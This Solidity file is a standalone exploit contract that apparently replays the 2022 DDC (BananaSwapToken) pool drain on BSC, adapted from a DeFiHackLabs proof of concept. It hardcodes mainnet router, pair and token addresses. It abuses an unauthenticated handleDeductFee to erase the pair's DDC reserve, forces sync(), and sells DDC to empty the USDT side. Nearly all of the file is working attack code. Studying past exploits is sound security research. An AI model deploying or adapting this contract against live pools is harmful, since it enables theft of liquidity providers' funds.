// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the DDC (BananaSwapToken) pool-reserve drain
// (BSC, 2022-08-28). The DeFiHackLabs PoC runs the whole attack INLINE in the
// Foundry `ContractTest` (no standalone exploit contract); this file faithfully
// copies that inline logic into a self-contained contract so the recorder can
// deploy + record a single `attack()` call.
//
// Root cause: BananaSwapToken.handleDeductFee() is `external` with NO access
// control and debits a CALLER-SUPPLIED `from`. Pointing `from` at the DDC/USDT
// pair lets an attacker erase the pair's DDC balance, then pair.sync() adopts
// the depleted balance as the reserve (breaking x*y=k), and a tiny DDC sell
// drains the entire USDT side.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

interface ITokenAFeeHandler is IERC20 {
    // ActionType.Buy = 0; ActionType.Sell = 1
    function handleDeductFee(uint8 actionType, uint256 feeAmount, address from, address user) external;
}

interface IRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPair {
    function sync() external;
}

contract DDCExploit {
    IERC20 internal constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IRouter internal constant TargetRouter = IRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ITokenAFeeHandler internal constant DDC = ITokenAFeeHandler(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1);
    IPair internal constant TargetPair = IPair(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0);

    function attack() external payable {
        // Step 1 — wrap the 0.1 BNB sent as msg.value into WBNB (seed capital).
        address(WBNB).call{value: 0.1 ether}("");
        _buyDDC();

        // Step 2 — the exploit: drain the pair's DDC balance to 1 wei via the
        // unauthenticated fee handler. `from` = the AMM pair, so distributeFee
        // debits the pair's reserve.
        uint256 pairReserve = DDC.balanceOf(address(TargetPair));
        uint256 amount = pairReserve - 1;
        DDC.handleDeductFee(0, amount, address(TargetPair), address(this));

        // Step 3 — force the pair to adopt the depleted DDC balance as its
        // reserve (USDT untouched). x*y=k collapses.
        TargetPair.sync();

        // Step 4 — sell the (now hugely valuable vs reserves) DDC for USDT,
        // emptying the pair's USDT side.
        _sellDDC();
    }

    function _buyDDC() internal {
        WBNB.approve(address(TargetRouter), type(uint256).max);
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        path[2] = address(DDC);
        TargetRouter.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        DDC.approve(address(TargetRouter), type(uint256).max);
    }

    function _sellDDC() internal {
        address[] memory path = new address[](2);
        path[0] = address(DDC);
        path[1] = address(USDT);
        TargetRouter.swapExactTokensForTokens(DDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
